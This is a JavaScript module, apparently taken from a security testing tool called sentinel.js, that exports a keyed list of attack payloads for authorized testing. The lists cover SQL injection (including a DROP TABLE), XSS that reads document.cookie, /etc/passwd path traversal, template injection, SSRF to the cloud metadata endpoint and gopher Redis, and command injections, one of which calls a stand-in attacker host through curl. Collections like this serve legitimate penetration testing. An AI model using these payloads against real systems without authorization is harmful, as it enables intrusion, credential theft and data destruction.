"use strict";
// Attack-payload library keyed by vulnerability class (sqli/xss/lfi/cmdi/ssti/ssrf).
// Pure data — sentinel.js printPayloads() handles presentation. For AUTHORIZED
// testing only. Extracted from sentinel.js.
const PAYLOADS_CLI = {
  sqli: ["' OR '1'='1", "' OR 1=1-- -", "admin'-- -", "' UNION SELECT NULL-- -", "1' AND SLEEP(5)-- -", "') OR ('1'='1", "'; DROP TABLE users-- -"],
  xss: ["<script>alert(1)</script>", "\"><svg onload=alert(1)>", "<img src=x onerror=alert(1)>", "javascript:alert(document.domain)", "'\"><script>alert(document.cookie)</script>"],
  lfi: ["../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd", "php://filter/convert.base64-encode/resource=index.php", "/proc/self/environ", "....//....//etc/passwd"],
  cmdi: ["; id", "| id", "$(id)", "`id`", "&& whoami", "; cat /etc/passwd", "$(curl http://ATTACKER)"],
  ssti: ["{{7*7}}", "${7*7}", "#{7*7}", "{{config}}", "<%= 7*7 %>", "{{''.__class__.__mro__[1].__subclasses__()}}"],
  ssrf: ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:80", "file:///etc/passwd", "gopher://127.0.0.1:6379/_", "http://[::1]/"],
};
function payloadClasses() { return Object.keys(PAYLOADS_CLI); }
module.exports = { PAYLOADS_CLI, payloadClasses };
